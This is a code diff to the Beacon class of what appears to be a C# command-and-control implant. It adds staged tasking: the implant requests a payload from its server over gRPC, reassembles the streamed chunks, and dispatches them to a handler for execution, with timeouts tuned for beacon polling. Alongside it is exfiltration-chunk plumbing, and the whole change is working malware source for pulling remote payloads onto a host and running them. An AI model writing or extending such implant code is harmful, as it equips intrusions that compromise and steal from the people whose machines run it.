@@ -224,6 +224,9 @@ internal sealed class Beacon
         // up. Stream mode blocks until the server closes; poll mode drains the
         // queue and ends the cycle on a short idle window (below), so the
         // implant can sleep the beacon interval instead of holding a line open.
+        // A staged task (the typed arm, architecture.md Sec 10) is demanded and
+        // reassembled before its handler runs -- the bulk payload arrives as a
+        // chunk run, never inside the arguments string.
         while (await MoveNextFrameAsync(call.ResponseStream, cancellationToken))
         {
             var frame = call.ResponseStream.Current;
@@ -241,6 +244,11 @@ internal sealed class Beacon
                 _log.WriteLine($"task {task.TaskId} rejected: signature verification failed");
                 outcome = TaskOutcome.Failed;
                 output = "task rejected: signature verification failed; not executed";
+                chunks = Array.Empty<ExfilChunk>();
+            }
+            else if (task.HasStagedBytes)
+            {
+                (outcome, output) = await RunStagedTaskAsync(call, task, cancellationToken);
                 chunks = Array.Empty<ExfilChunk>();
             }
             else
@@ -298,11 +306,98 @@ internal sealed class Beacon
     }
 
     // How long a poll-mode read waits for the next downstream frame before
-    // deciding the queue is drained. Well above the server's dispatch poll
-    // interval, so a queued task is not cut in half; a close that races a
-    // dispatch is still safe -- an unclaimed task stays queued, and a task
-    // whose frame write failed is requeued server-side.
+    // deciding the queue is drained. The server pushes tasking the moment it
+    // is queued, so the window only needs to outlast that push; a close that
+    // races a dispatch is still safe -- an unclaimed task stays queued, and a
+    // task whose frame write failed is requeued server-side. Staged transfers
+    // never see this window: they read on the longer deadline below.
     private static readonly TimeSpan PollIdleWindow = TimeSpan.FromMilliseconds(250);
+
+    // How long a staged read waits for the next chunk before giving up on the
+    // transfer. An active transfer is the implant's own request in flight --
+    // unlike the idle window this must not cut a run in half, so it is a
+    // timeout, not a cadence: a server that cannot produce the next chunk
+    // within it has failed the transfer.
+    private static readonly TimeSpan StagedChunkTimeout = TimeSpan.FromSeconds(30);
+
+    // Runs one staged task (architecture.md Sec 10, the typed arm): demand the
+    // payload, reassemble the chunk run the server answers with, then dispatch
+    // the verb's staged handler. A transfer that ends early (stream dropped,
+    // timeout, terminal chunk never arrived) is reported Failed on the task
+    // itself -- the operator sees the cause where they look for the outcome.
+    private async Task<(TaskOutcome Outcome, string Output)> RunStagedTaskAsync(
+        AsyncDuplexStreamingCall<Frame, Frame> call,
+        TaskRequest task,
+        CancellationToken cancellationToken)
+    {
+        await call.RequestStream.WriteAsync(new Frame
+        {
+            Payload = ByteString.CopyFrom(new StagedPull { TaskId = task.TaskId }.ToByteArray()),
+            Kind = FrameKind.StagedPull,
+        });
+
+        var parts = new List<byte[]>();
+        var total = 0;
+        while (true)
+        {
+            if (!await MoveNextStagedAsync(call.ResponseStream, cancellationToken))
+            {
+                _log.WriteLine($"task {task.TaskId}: staged stream ended before the terminal chunk");
+                return (TaskOutcome.Failed, "staged payload stream ended before the terminal chunk");
+            }
+
+            StagedChunk chunk;
+            try
+            {
+                chunk = StagedChunk.Parser.ParseFrom(call.ResponseStream.Current.Payload);
+            }
+            catch (Google.Protobuf.InvalidProtocolBufferException)
+            {
+                return (TaskOutcome.Failed, "staged payload contained a malformed chunk");
+            }
+            if (chunk.TaskId != task.TaskId)
+                return (TaskOutcome.Failed, "staged payload chunk carried a foreign task id");
+
+            var data = chunk.Data.ToArray();
+            parts.Add(data);
+            total += data.Length;
+            if (chunk.Terminal)
+                break;
+        }
+
+        var payload = new byte[total];
+        var offset = 0;
+        foreach (var part in parts)
+        {
+            part.CopyTo(payload, offset);
+            offset += part.Length;
+        }
+        return _handlers.DispatchStaged(task.Verb, task.Arguments, payload);
+    }
+
+    // One read of a staged chunk run: stream mode blocks on the token, poll
+    // mode reads on the transfer timeout instead of the idle window so an
+    // in-flight run is not mistaken for a drained queue.
+    private async Task<bool> MoveNextStagedAsync(Grpc.Core.IAsyncStreamReader<Frame> stream, CancellationToken cancellationToken)
+    {
+        if (!IsPoll)
+            return await stream.MoveNext(cancellationToken);
+
+        using var deadline = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
+        deadline.CancelAfter(StagedChunkTimeout);
+        try
+        {
+            return await stream.MoveNext(deadline.Token);
+        }
+        catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
+        {
+            return false;
+        }
+        catch (RpcException) when (deadline.IsCancellationRequested && !cancellationToken.IsCancellationRequested)
+        {
+            return false;
+        }
+    }
 
     private bool IsPoll => _mode == BeaconModes.Poll;
 
